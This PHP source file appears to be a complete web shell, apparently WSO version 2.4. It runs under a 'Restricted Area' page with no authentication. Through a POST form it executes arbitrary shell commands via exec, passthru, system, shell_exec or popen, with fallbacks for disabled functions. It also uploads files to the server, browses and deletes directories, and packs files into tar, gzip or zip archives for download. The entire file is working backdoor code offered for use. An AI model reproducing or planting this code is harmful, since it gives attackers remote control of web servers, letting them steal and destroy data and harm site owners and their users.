<?php

set_magic_quotes_runtime(0);

if(strtolower(substr(PHP_OS,0,3)) == "win") {
    define('DS', "\\") ;
    $os = 'win';
} else {
    define('DS', "/") ;
    $os = 'nix';
}

if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh)))
    		$files[] = $filename;
		return $files;
	}
}

function scandir_rec($dir, $dirs_only=false, $maxdepth=0, $writable=false, $no_root=false) {
    $_content = scandir($dir) ;
    $content = array() ;

    if(!$no_root) {
        if(is_dir($dir) || !$dirs_only) {
            if(!$writable || is_writeable($dir)) {
                $content[] = $dir ;
            }
        }
    }

    if($_content && is_array($_content)) {
        foreach($_content as $k=>$v) {
            if(!preg_match("/^\./", $v)) {
                if(is_dir($dir . DS . $v) || !$dirs_only) {
                    if(!$writable || is_writeable($dir . DS . $v)) {
                        $content[] = $dir . DS . $v ;
                    }
                }
            }
            if(!preg_match("/^\./", $v) && is_dir($dir . DS . $v)) {
                if($maxdepth > 0) { 
                    $__content = scandir_rec($dir . DS . $v, $dirs_only, $maxdepth-1, $writable, true) ;
                    if($__content) {
                        foreach($__content as $kk=>$vv) {
                            if(is_dir($dir . DS . $v) || !$dirs_only) {
                                if(!$writable || is_writeable($dir . DS . $vv)) {
                                    $content[] = $vv ;
                                }
                            }
                        }
                    }
                }
            }    
        }
    }
    return $content ;
}

function cust_function_exists($function) {
  $disabled = explode(', ', ini_get('disable_functions'));
  return !in_array($function, $disabled) && function_exists($function);
}

function deleteDir($path) {
	$path = (substr($path,-1)=='/') ? $path:$path.'/';
	$dh  = opendir($path);
	while ( ($item = readdir($dh) ) !== false) {
		$item = $path.$item;
		if ( (basename($item) == "..") || (basename($item) == ".") )
			continue;
		if (is_dir($item)) {
			deleteDir($item);
        } elseif(is_file($item)) {
            @unlink($item);
        }
    }
	closedir($dh);
	@rmdir($path);
}

function smartCopy($source, $dest, $options=array('folderPermission'=>0777,'filePermission'=>0777)) {
    $result=false;

    if (is_file($source)) {
        if ($dest[strlen($dest)-1]=='/') {
            if (!file_exists($dest)) {
                cmfcDirectory::makeAll($dest,$options['folderPermission'],true);
            }
            $__dest=$dest."/".basename($source);
        } else {
            $__dest=$dest;
        }
        $result=copy($source, $__dest);
        chmod($__dest,$options['filePermission']);
       
     } elseif(is_dir($source)) {
        if ($dest[strlen($dest)-1]=='/') {
            if ($source[strlen($source)-1]=='/') {
                //Copy only contents
            } else {
                //Change parent itself and its contents
                $dest=$dest.basename($source);
                @mkdir($dest);
                chmod($dest,$options['filePermission']);
            }
        } else {
            if ($source[strlen($source)-1]=='/') {
                //Copy parent directory with new name and all its content
                @mkdir($dest,$options['folderPermission']);
                chmod($dest,$options['filePermission']);
            } else {
                //Copy parent directory with new name and all its content
                @mkdir($dest,$options['folderPermission']);
                chmod($dest,$options['filePermission']);
            }
        }

        $dirHandle=opendir($source);
        while($file=readdir($dirHandle))
        {
            if($file!="." && $file!="..")
            {
                if(!is_dir($source."/".$file)) {
                    $__dest=$dest."/".$file;
                } else {
                    $__dest=$dest."/".$file;
                }
                //echo "$source/$file ||| $__dest<br />";
                $result=smartCopy($source."/".$file, $__dest, $options);
            }
        }
        closedir($dirHandle);
           
    } else {
        $result=false;
    }
    return $result;
 } 

class archive
{
	function archive($name)
	{
		$this->options = array (
			'basedir' => ".",
			'name' => $name,
			'prepend' => "",
			'inmemory' => 0,
			'overwrite' => 0,
			'recurse' => 1,
			'storepaths' => 1,
			'followlinks' => 0,
			'level' => 3,
			'method' => 1,
			'sfx' => "",
			'type' => "",
			'comment' => ""
		);
		$this->files = array ();
		$this->exclude = array ();
		$this->storeonly = array ();
		$this->error = array ();
	}

	function set_options($options)
	{
		foreach ($options as $key => $value)
			$this->options[$key] = $value;
		if (!empty ($this->options['basedir']))
		{
			$this->options['basedir'] = str_replace("\\", "/", $this->options['basedir']);
			$this->options['basedir'] = preg_replace("/\/+/", "/", $this->options['basedir']);
			$this->options['basedir'] = preg_replace("/\/$/", "", $this->options['basedir']);
		}
		if (!empty ($this->options['name']))
		{
			$this->options['name'] = str_replace("\\", "/", $this->options['name']);
			$this->options['name'] = preg_replace("/\/+/", "/", $this->options['name']);
		}
		if (!empty ($this->options['prepend']))
		{
			$this->options['prepend'] = str_replace("\\", "/", $this->options['prepend']);
			$this->options['prepend'] = preg_replace("/^(\.*\/+)+/", "", $this->options['prepend']);
			$this->options['prepend'] = preg_replace("/\/+/", "/", $this->options['prepend']);
			$this->options['prepend'] = preg_replace("/\/$/", "", $this->options['prepend']) . "/";
		}
	}

	function create_archive()
	{
		$this->make_list();

		if ($this->options['inmemory'] == 0)
		{
			$pwd = getcwd();
			chdir($this->options['basedir']);
			if ($this->options['overwrite'] == 0 && file_exists($this->options['name'] . ($this->options['type'] == "gzip" || $this->options['type'] == "bzip" ? ".tmp" : "")))
			{
				$this->error[] = "File {$this->options['name']} already exists.";
				chdir($pwd);
				return 0;
			}
			else if ($this->archive = @fopen($this->options['name'] . ($this->options['type'] == "gzip" || $this->options['type'] == "bzip" ? ".tmp" : ""), "wb+"))
				chdir($pwd);
			else
			{
				$this->error[] = "Could not open {$this->options['name']} for writing.";
				chdir($pwd);
				return 0;
			}
		}
		else
			$this->archive = "";

		switch ($this->options['type'])
		{
		case "zip":
			if (!$this->create_zip())
			{
				$this->error[] = "Could not create zip file.";
				return 0;
			}
			break;
		case "bzip":
			if (!$this->create_tar())
			{
				$this->error[] = "Could not create tar file.";
				return 0;
			}
			if (!$this->create_bzip())
			{
				$this->error[] = "Could not create bzip2 file.";
				return 0;
			}
			break;
		case "gzip":
			if (!$this->create_tar())
			{
				$this->error[] = "Could not create tar file.";
				return 0;
			}
			if (!$this->create_gzip())
			{
				$this->error[] = "Could not create gzip file.";
				return 0;
			}
			break;
		case "tar":
			if (!$this->create_tar())
			{
				$this->error[] = "Could not create tar file.";
				return 0;
			}
		}

		if ($this->options['inmemory'] == 0)
		{
			fclose($this->archive);
			if ($this->options['type'] == "gzip" || $this->options['type'] == "bzip")
				unlink($this->options['basedir'] . "/" . $this->options['name'] . ".tmp");
		}
	}

	function add_data($data)
	{
		if ($this->options['inmemory'] == 0)
			fwrite($this->archive, $data);
		else
			$this->archive .= $data;
	}

	function make_list()
	{
		if (!empty ($this->exclude))
			foreach ($this->files as $key => $value)
				foreach ($this->exclude as $current)
					if ($value['name'] == $current['name'])
						unset ($this->files[$key]);
		if (!empty ($this->storeonly))
			foreach ($this->files as $key => $value)
				foreach ($this->storeonly as $current)
					if ($value['name'] == $current['name'])
						$this->files[$key]['method'] = 0;
		unset ($this->exclude, $this->storeonly);
	}

	function add_files($list)
	{
		$temp = $this->list_files($list);
		foreach ($temp as $current)
			$this->files[] = $current;
	}

	function exclude_files($list)
	{
		$temp = $this->list_files($list);
		foreach ($temp as $current)
			$this->exclude[] = $current;
	}

	function store_files($list)
	{
		$temp = $this->list_files($list);
		foreach ($temp as $current)
			$this->storeonly[] = $current;
	}

	function list_files($list)
	{
		if (!is_array ($list))
		{
			$temp = $list;
			$list = array ($temp);
			unset ($temp);
		}

		$files = array ();

		$pwd = getcwd();
		chdir($this->options['basedir']);

		foreach ($list as $current)
		{
			$current = str_replace("\\", "/", $current);
			$current = preg_replace("/\/+/", "/", $current);
			$current = preg_replace("/\/$/", "", $current);
			if (strstr($current, "*"))
			{
				$regex = preg_replace("/([\\\^\$\.\[\]\|\(\)\?\+\{\}\/])/", "\\\\\\1", $current);
				$regex = str_replace("*", ".*", $regex);
				$dir = strstr($current, "/") ? substr($current, 0, strrpos($current, "/")) : ".";
				$temp = $this->parse_dir($dir);
				foreach ($temp as $current2)
					if (preg_match("/^{$regex}$/i", $current2['name']))
						$files[] = $current2;
				unset ($regex, $dir, $temp, $current);
			}
			else if (@is_dir($current))
			{
				$temp = $this->parse_dir($current);
				foreach ($temp as $file)
					$files[] = $file;
				unset ($temp, $file);
			}
			else if (@file_exists($current))
				$files[] = array ('name' => $current, 'name2' => $this->options['prepend'] .
					preg_replace("/(\.+\/+)+/", "", ($this->options['storepaths'] == 0 && strstr($current, "/")) ?
					substr($current, strrpos($current, "/") + 1) : $current),
					'type' => @is_link($current) && $this->options['followlinks'] == 0 ? 2 : 0,
					'ext' => substr($current, strrpos($current, ".")), 'stat' => stat($current));
		}

		chdir($pwd);

		unset ($current, $pwd);

		usort($files, array ("archive", "sort_files"));

		return $files;
	}

	function parse_dir($dirname)
	{
		if ($this->options['storepaths'] == 1 && !preg_match("/^(\.+\/*)+$/", $dirname))
			$files = array (array ('name' => $dirname, 'name2' => $this->options['prepend'] .
				preg_replace("/(\.+\/+)+/", "", ($this->options['storepaths'] == 0 && strstr($dirname, "/")) ?
				substr($dirname, strrpos($dirname, "/") + 1) : $dirname), 'type' => 5, 'stat' => stat($dirname)));
		else
			$files = array ();
		$dir = @opendir($dirname);

		while ($file = @readdir($dir))
		{
			$fullname = $dirname . "/" . $file;
			if ($file == "." || $file == "..")
				continue;
			else if (@is_dir($fullname))
			{
				if (empty ($this->options['recurse']))
					continue;
				$temp = $this->parse_dir($fullname);
				foreach ($temp as $file2)
					$files[] = $file2;
			}
			else if (@file_exists($fullname))
				$files[] = array ('name' => $fullname, 'name2' => $this->options['prepend'] .
					preg_replace("/(\.+\/+)+/", "", ($this->options['storepaths'] == 0 && strstr($fullname, "/")) ?
					substr($fullname, strrpos($fullname, "/") + 1) : $fullname),
					'type' => @is_link($fullname) && $this->options['followlinks'] == 0 ? 2 : 0,
					'ext' => substr($file, strrpos($file, ".")), 'stat' => stat($fullname));
		}

		@closedir($dir);

		return $files;
	}

	function sort_files($a, $b)
	{
		if ($a['type'] != $b['type'])
			if ($a['type'] == 5 || $b['type'] == 2)
				return -1;
			else if ($a['type'] == 2 || $b['type'] == 5)
				return 1;
		else if ($a['type'] == 5)
			return strcmp(strtolower($a['name']), strtolower($b['name']));
		else if ($a['ext'] != $b['ext'])
			return strcmp($a['ext'], $b['ext']);
		else if ($a['stat'][7] != $b['stat'][7])
			return $a['stat'][7] > $b['stat'][7] ? -1 : 1;
		else
			return strcmp(strtolower($a['name']), strtolower($b['name']));
		return 0;
	}

	function download_file()
	{
		if ($this->options['inmemory'] == 0)
		{
			$this->error[] = "Can only use download_file() if archive is in memory. Redirect to file otherwise, it is faster.";
			return;
		}
		switch ($this->options['type'])
		{
		case "zip":
			header("Content-Type: application/zip");
			break;
		case "bzip":
			header("Content-Type: application/x-bzip2");
			break;
		case "gzip":
			header("Content-Type: application/x-gzip");
			break;
		case "tar":
			header("Content-Type: application/x-tar");
		}
		$header = "Content-Disposition: attachment; filename=\"";
		$header .= strstr($this->options['name'], "/") ? substr($this->options['name'], strrpos($this->options['name'], "/") + 1) : $this->options['name'];
		$header .= "\"";
		header($header);
		header("Content-Length: " . strlen($this->archive));
		header("Content-Transfer-Encoding: binary");
		header("Cache-Control: no-cache, must-revalidate, max-age=60");
		header("Expires: Sat, 01 Jan 2000 12:00:00 GMT");
		print($this->archive);
	}
}

class tar_file extends archive
{
	function tar_file($name)
	{
		$this->archive($name);
		$this->options['type'] = "tar";
	}

	function create_tar()
	{
		$pwd = getcwd();
		chdir($this->options['basedir']);

		foreach ($this->files as $current)
		{
			if ($current['name'] == $this->options['name'])
				continue;
			if (strlen($current['name2']) > 99)
			{
				$path = substr($current['name2'], 0, strpos($current['name2'], "/", strlen($current['name2']) - 100) + 1);
				$current['name2'] = substr($current['name2'], strlen($path));
				if (strlen($path) > 154 || strlen($current['name2']) > 99)
				{
					$this->error[] = "Could not add {$path}{$current['name2']} to archive because the filename is too long.";
					continue;
				}
			}
			$block = pack("a100a8a8a8a12a12a8a1a100a6a2a32a32a8a8a155a12", $current['name2'], sprintf("%07o", 
				$current['stat'][2]), sprintf("%07o", $current['stat'][4]), sprintf("%07o", $current['stat'][5]), 
				sprintf("%011o", $current['type'] == 2 ? 0 : $current['stat'][7]), sprintf("%011o", $current['stat'][9]), 
				"        ", $current['type'], $current['type'] == 2 ? @readlink($current['name']) : "", "ustar ", " ", 
				"Unknown", "Unknown", "", "", !empty ($path) ? $path : "", "");

			$checksum = 0;
			for ($i = 0; $i < 512; $i++)
				$checksum += ord(substr($block, $i, 1));
			$checksum = pack("a8", sprintf("%07o", $checksum));
			$block = substr_replace($block, $checksum, 148, 8);

			if ($current['type'] == 2 || $current['stat'][7] == 0)
				$this->add_data($block);
			else if ($fp = @fopen($current['name'], "rb"))
			{
				$this->add_data($block);
				while ($temp = fread($fp, 1048576))
					$this->add_data($temp);
				if ($current['stat'][7] % 512 > 0)
				{
					$temp = "";
					for ($i = 0; $i < 512 - $current['stat'][7] % 512; $i++)
						$temp .= "\0";
					$this->add_data($temp);
				}
				fclose($fp);
			}
			else
				$this->error[] = "Could not open file {$current['name']} for reading. It was not added.";
		}

		$this->add_data(pack("a1024", ""));

		chdir($pwd);

		return 1;
	}

	function extract_files()
	{
		$pwd = getcwd();
		chdir($this->options['basedir']);

		if ($fp = $this->open_archive())
		{
			if ($this->options['inmemory'] == 1)
				$this->files = array ();

			while ($block = fread($fp, 512))
			{
				$temp = unpack("a100name/a8mode/a8uid/a8gid/a12size/a12mtime/a8checksum/a1type/a100symlink/a6magic/a2temp/a32temp/a32temp/a8temp/a8temp/a155prefix/a12temp", $block);
				$file = array (
					'name' => $temp['prefix'] . $temp['name'],
					'stat' => array (
						2 => $temp['mode'],
						4 => octdec($temp['uid']),
						5 => octdec($temp['gid']),
						7 => octdec($temp['size']),
						9 => octdec($temp['mtime']),
					),
					'checksum' => octdec($temp['checksum']),
					'type' => $temp['type'],
					'magic' => $temp['magic'],
				);
				if ($file['checksum'] == 0x00000000)
					break;
				else if (substr($file['magic'], 0, 5) != "ustar")
				{
					$this->error[] = "This script does not support extracting this type of tar file.";
					break;
				}
				$block = substr_replace($block, "        ", 148, 8);
				$checksum = 0;
				for ($i = 0; $i < 512; $i++)
					$checksum += ord(substr($block, $i, 1));
				if ($file['checksum'] != $checksum)
					$this->error[] = "Could not extract from {$this->options['name']}, it is corrupt.";

				if ($this->options['inmemory'] == 1)
				{
					$file['data'] = fread($fp, $file['stat'][7]);
					fread($fp, (512 - $file['stat'][7] % 512) == 512 ? 0 : (512 - $file['stat'][7] % 512));
					unset ($file['checksum'], $file['magic']);
					$this->files[] = $file;
				}
				else if ($file['type'] == 5)
				{
					if (!is_dir($file['name']))
						mkdir($file['name'], $file['stat'][2]);
				}
				else if ($this->options['overwrite'] == 0 && file_exists($file['name']))
				{
					$this->error[] = "{$file['name']} already exists.";
					continue;
				}
				else if ($file['type'] == 2)
				{
					symlink($temp['symlink'], $file['name']);
					chmod($file['name'], $file['stat'][2]);
				}
				else if ($new = @fopen($file['name'], "wb"))
				{
					fwrite($new, fread($fp, $file['stat'][7]));
					fread($fp, (512 - $file['stat'][7] % 512) == 512 ? 0 : (512 - $file['stat'][7] % 512));
					fclose($new);
					chmod($file['name'], $file['stat'][2]);
				}
				else
				{
					$this->error[] = "Could not open {$file['name']} for writing.";
					continue;
				}
				chown($file['name'], $file['stat'][4]);
				chgrp($file['name'], $file['stat'][5]);
				touch($file['name'], $file['stat'][9]);
				unset ($file);
			}
		}
		else
			$this->error[] = "Could not open file {$this->options['name']}";

		chdir($pwd);
	}

	function open_archive()
	{
		return @fopen($this->options['name'], "rb");
	}
}

class gzip_file extends tar_file
{
	function gzip_file($name)
	{
		$this->tar_file($name);
		$this->options['type'] = "gzip";
	}

	function create_gzip()
	{
		if ($this->options['inmemory'] == 0)
		{
			$pwd = getcwd();
			chdir($this->options['basedir']);
			if ($fp = gzopen($this->options['name'], "wb{$this->options['level']}"))
			{
				fseek($this->archive, 0);
				while ($temp = fread($this->archive, 1048576))
					gzwrite($fp, $temp);
				gzclose($fp);
				chdir($pwd);
			}
			else
			{
				$this->error[] = "Could not open {$this->options['name']} for writing.";
				chdir($pwd);
				return 0;
			}
		}
		else
			$this->archive = gzencode($this->archive, $this->options['level']);

		return 1;
	}

	function open_archive()
	{
		return @gzopen($this->options['name'], "rb");
	}
}

class bzip_file extends tar_file
{
	function bzip_file($name)
	{
		$this->tar_file($name);
		$this->options['type'] = "bzip";
	}

	function create_bzip()
	{
		if ($this->options['inmemory'] == 0)
		{
			$pwd = getcwd();
			chdir($this->options['basedir']);
			if ($fp = bzopen($this->options['name'], "wb"))
			{
				fseek($this->archive, 0);
				while ($temp = fread($this->archive, 1048576))
					bzwrite($fp, $temp);
				bzclose($fp);
				chdir($pwd);
			}
			else
			{
				$this->error[] = "Could not open {$this->options['name']} for writing.";
				chdir($pwd);
				return 0;
			}
		}
		else
			$this->archive = bzcompress($this->archive, $this->options['level']);

		return 1;
	}

	function open_archive()
	{
		return @bzopen($this->options['name'], "rb");
	}
}

class zip_file extends archive
{
	function zip_file($name)
	{
		$this->archive($name);
		$this->options['type'] = "zip";
	}

	function create_zip()
	{
		$files = 0;
		$offset = 0;
		$central = "";

		if (!empty ($this->options['sfx']))
			if ($fp = @fopen($this->options['sfx'], "rb"))
			{
				$temp = fread($fp, filesize($this->options['sfx']));
				fclose($fp);
				$this->add_data($temp);
				$offset += strlen($temp);
				unset ($temp);
			}
			else
				$this->error[] = "Could not open sfx module from {$this->options['sfx']}.";

		$pwd = getcwd();
		chdir($this->options['basedir']);

		foreach ($this->files as $current)
		{
			if ($current['name'] == $this->options['name'])
				continue;

			$timedate = explode(" ", date("Y n j G i s", $current['stat'][9]));
			$timedate = ($timedate[0] - 1980 << 25) | ($timedate[1] << 21) | ($timedate[2] << 16) |
				($timedate[3] << 11) | ($timedate[4] << 5) | ($timedate[5]);

			$block = pack("VvvvV", 0x04034b50, 0x000A, 0x0000, (isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate);

			if ($current['stat'][7] == 0 && $current['type'] == 5)
			{
				$block .= pack("VVVvv", 0x00000000, 0x00000000, 0x00000000, strlen($current['name2']) + 1, 0x0000);
				$block .= $current['name2'] . "/";
				$this->add_data($block);
				$central .= pack("VvvvvVVVVvvvvvVV", 0x02014b50, 0x0014, $this->options['method'] == 0 ? 0x0000 : 0x000A, 0x0000,
					(isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate,
					0x00000000, 0x00000000, 0x00000000, strlen($current['name2']) + 1, 0x0000, 0x0000, 0x0000, 0x0000, $current['type'] == 5 ? 0x00000010 : 0x00000000, $offset);
				$central .= $current['name2'] . "/";
				$files++;
				$offset += (31 + strlen($current['name2']));
			}
			else if ($current['stat'][7] == 0)
			{
				$block .= pack("VVVvv", 0x00000000, 0x00000000, 0x00000000, strlen($current['name2']), 0x0000);
				$block .= $current['name2'];
				$this->add_data($block);
				$central .= pack("VvvvvVVVVvvvvvVV", 0x02014b50, 0x0014, $this->options['method'] == 0 ? 0x0000 : 0x000A, 0x0000,
					(isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate,
					0x00000000, 0x00000000, 0x00000000, strlen($current['name2']), 0x0000, 0x0000, 0x0000, 0x0000, $current['type'] == 5 ? 0x00000010 : 0x00000000, $offset);
				$central .= $current['name2'];
				$files++;
				$offset += (30 + strlen($current['name2']));
			}
			else if ($fp = @fopen($current['name'], "rb"))
			{
				$temp = fread($fp, $current['stat'][7]);
				fclose($fp);
				$crc32 = crc32($temp);
				if (!isset($current['method']) && $this->options['method'] == 1)
				{
					$temp = gzcompress($temp, $this->options['level']);
					$size = strlen($temp) - 6;
					$temp = substr($temp, 2, $size);
				}
				else
					$size = strlen($temp);
				$block .= pack("VVVvv", $crc32, $size, $current['stat'][7], strlen($current['name2']), 0x0000);
				$block .= $current['name2'];
				$this->add_data($block);
				$this->add_data($temp);
				unset ($temp);
				$central .= pack("VvvvvVVVVvvvvvVV", 0x02014b50, 0x0014, $this->options['method'] == 0 ? 0x0000 : 0x000A, 0x0000,
					(isset($current['method']) || $this->options['method'] == 0) ? 0x0000 : 0x0008, $timedate,
					$crc32, $size, $current['stat'][7], strlen($current['name2']), 0x0000, 0x0000, 0x0000, 0x0000, 0x00000000, $offset);
				$central .= $current['name2'];
				$files++;
				$offset += (30 + strlen($current['name2']) + $size);
			}
			else
				$this->error[] = "Could not open file {$current['name']} for reading. It was not added.";
		}

		$this->add_data($central);

		$this->add_data(pack("VvvvvVVv", 0x06054b50, 0x0000, 0x0000, $files, $files, strlen($central), $offset,
			!empty ($this->options['comment']) ? strlen($this->options['comment']) : 0x0000));

		if (!empty ($this->options['comment']))
			$this->add_data($this->options['comment']);

		chdir($pwd);

		return 1;
	}
}

function copy_paste($c,$s,$d){
	if(is_dir($c.$s)) {
    	mkdir($d.$s);
		$h = @opendir($c.$s);
		while (($f = @readdir($h)) !== false) {
			if (($f != ".") and ($f != "..")) {
                copy_paste($c.$s.DS,$f, $d.$s.DS);
            }
        }
	} elseif(is_file($c.$s)) {
        @copy($c.$s, $d.$s);
    }
}

function system_custom($in) {

    $out = '';
    $system = false ;
    if (cust_function_exists('exec')) {
        $system = true ;
        @exec($in,$out);
		$out = @join("\n",$out);
    } elseif (cust_function_exists('passthru')) {
        $system = true ;
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
    } elseif (cust_function_exists('system')) {
        $system = true ;
		ob_start();
		@system($in);
		$out = ob_get_clean();
    } elseif (cust_function_exists('shell_exec')) {
        $system = true ;
		$out = shell_exec($in);
    } elseif (is_resource($f = @popen($in,"r"))) {
        $system = true ;
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
    }

    if($system) {
        return $out;
    }

    $commands = explode(";", $in) ;

    $out = '' ;
    $path = '' ;

    if($commands) {
        foreach($commands as $command) {
            $command_parts = explode(" ", $command) ;
            $command_head = $command_parts[0] ;
            $params = array() ;
            if(count($command_parts) > 1) {
                for($i=1;$i<count($command_parts);$i++) {
                    $params[] = trim($command_parts[$i]) ;
                }
            }

            switch($command_head) {
            case "cd":
                if($params[0]) {
                    $path = $params[0] ;
                    if(is_dir($path)) {
                        @chdir($path) ;
                    }
                }
                break;
            case "tar":
                if(count($params) > 1) {
                    $archive = new gzip_file($params[0]);
                    $archive->set_options(array('basedir' => $path, 'overwrite' => 1, 'level' => 1));
                    $archive->add_files(array($params[1]));
                    $archive->create_archive();
                }
                break;
            case "zip":
				if(class_exists('ZipArchive') && count($params) > 1) {
                    $zip = new ZipArchive();
                    if ($zip->open($params[0], 1)) {
                        foreach($params as $k=>$param) {
                            if($k == 0 || $param == '..')
                                continue;
                            if(@is_file($param))
                                $zip->addFile($param, $param);
                            elseif(@is_dir($param)) {
                                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($param.DS));
                                foreach ($iterator as $key=>$value) {
                                    $zip->addFile(realpath($key), $key);
                                }
                            }
                        }
                        $zip->close();
                    }
                }
                break;
            case "unzip":
    			if(class_exists('ZipArchive') && count($params) > 0) {
                    $zip = new ZipArchive();
                    foreach($params as $k=>$param) {
                        if($zip->open($param)) {
                            $zip->extractTo($path);
                            $zip->close();
                        }
                    }
                }                
                break;
            case "cp":
                smartCopy($params[0], $params[1]) ;
                break;
            case "mv":
                @rename($params[0], $params[1]) ;
                break;
            case "rm":
                foreach($params as $param) {
                    if(!preg_match("/^-/", $param)) {
                        if($param == '..')
                            continue;
						$param = urldecode($param);
						if(is_dir($param)) {
							deleteDir($param);
                        } elseif(is_file($param)) {
                            @unlink($param);
                        }
                    }
                }
                break;
            case "uname":
                $out = php_uname(preg_replace("/^-/", "", $params[0])) ;
                break;
            case "find":
                $out = scandir_rec($params[0], true, 1) ;
                $out = implode("\n", $out) ;
                break;
            case "ls":
                if(isset($params[0]) && $params[0] == '-F') {
                    $_path = $path ;
                    if(isset($params[1])) {
                        $_path = $params[1] ;
                    }
                    $out = glob($_path . '/*' , GLOB_ONLYDIR);
                    if(!empty($out)) {
                        foreach($out as $k=>$v) {
                            $out[$k] = preg_replace("/^" . preg_quote($_path.DS,DS) . "/","",$v) . DS ;
                        }
                    }
                    $out = implode("\n", $out) ;
                } else {
                    $_path = $path ;
                    if(isset($params[1])) {
                        $_path = $params[1] ;
                    }
                    $out = glob($_path . '/*');
                    if(!empty($out)) {
                        foreach($out as $k=>$v) {
                            $out[$k] = preg_replace("/^" . preg_quote($path,DS) . "/","",$v) ;
                        }
                    }
                    $out = implode("\n", $out) ;
                }
                break;
            case "mkdir":
                @mkdir($params[0]) ;
                break;
            case "chmod":
                @chmod($params[1], $params[0]) ;
                break;   
            case "phpversion":
                $out = phpversion() ;
                break; 
            case "wso_version":
                $out = "2.4";
                break;
            case "safemode":
                $out = @ini_get('safe_mode') ;
                break;
            case 'pwd':
                $out = getcwd() ;
                break;
            default:
                break;
            }
        }
    }

    return $out ;

}

print "<style>body{font-family:trebuchet ms;font-size:16px;}hr{width:100%;height:2px;}</style>";
print "<center><h1>Restricted</h1></center>";
print "<center><h1>Area</h1></center>";
print "<hr><hr>";

if(isset($_POST['_cwd'])) {
    $currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
} else {
    $currentWD = '' ;
}
if(isset($_POST['_cmd'])) {
    $currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
} else {
    $currentCMD = '' ;
}

$UName  = system_custom('uname -a');
$SCWD   = system_custom('pwd');
$UserID = system_custom('id');

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "<table>";
print "<tr><td><b>?:</b></td><td>".(isset($_SERVER['REMOTE_HOST'])?$_SERVER['REMOTE_HOST']:"")." (".(isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:"").")</td></tr>";
print "<tr><td><b>s is:</b></td><td>".(isset($_SERVER['SERVER_SIGNATURE'])?$_SERVER['SERVER_SIGNATURE']:"")."</td></tr>";
print "<tr><td><b>ce e?:</b></td><td>$UName</td></tr>";
print "<tr><td><b>wtf:</b></td><td>$UserID</td></tr>";
print "</table>";

print "<hr><hr>";

if( isset($_POST['_act']) && $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -la";
}

print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( isset($_POST['_act']) && $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        if(!@move_uploaded_file($_FILES['_upl']['tmp_name'], $currentWD."/".$_FILES['_upl']['name'])) {
            $out = system_custom("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        }
        echo $out ;
        print "</pre><b>File uploaded successfully!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    $out = system_custom($currentCMD);
    echo $out ;
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}

exit;

?>
